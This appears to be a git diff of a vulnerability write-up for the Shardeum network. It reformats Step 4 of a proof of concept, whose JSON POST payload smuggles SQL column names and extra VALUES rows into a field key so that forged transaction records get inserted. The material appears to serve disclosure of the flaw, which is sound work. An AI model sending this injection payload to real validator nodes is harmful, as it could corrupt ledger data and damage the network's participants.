@@ -148,9 +148,30 @@ Run the local network by following the instructions in the [Shardeum repository]
 
 ### Step 4
 
-Send a POST request to the malicious validator with the following payload: \`\`\`json { "tx": { "txId": "9187322183472823932748", "originalTxData": {}, "cycle": 1, "timestamp": 1697192678, " cycle, originalTxData, timestamp, txId) VALUES (1, '{}', 111111111, 'tx12345'), (?, '{}', 1666, '123123'), (?, ?, ?, ?);": "22222" } } \`\`\`
+Send a POST request to the malicious validator with the following payload:&#x20;
 
-_**Note**_ For our example, this transaction data serves as the "real" transaction: \`\`\`json { "txId": "9187322183472823932748", "originalTxData": {}, "cycle": 1, "timestamp": 1697192678, } \`\`\`
+```json
+{
+  "tx":{
+    "txId":"9187322183472823932748",
+    "originalTxData":{},
+    "cycle":1,
+    "timestamp":1697192678,
+    " cycle, originalTxData, timestamp, txId) VALUES (1, '{}', 111111111, 'tx12345'), (?, '{}', 1666, '123123'), (?, ?, ?, ?);":"22222"
+  }
+}
+```
+
+_**Note**_ For our example, this transaction data serves as the "real" transaction:&#x20;
+
+```json
+{
+  "txId":"9187322183472823932748",
+  "originalTxData":{},
+  "cycle":1,
+  "timestamp":1697192678
+}
+```
 
 ### Step 5
 
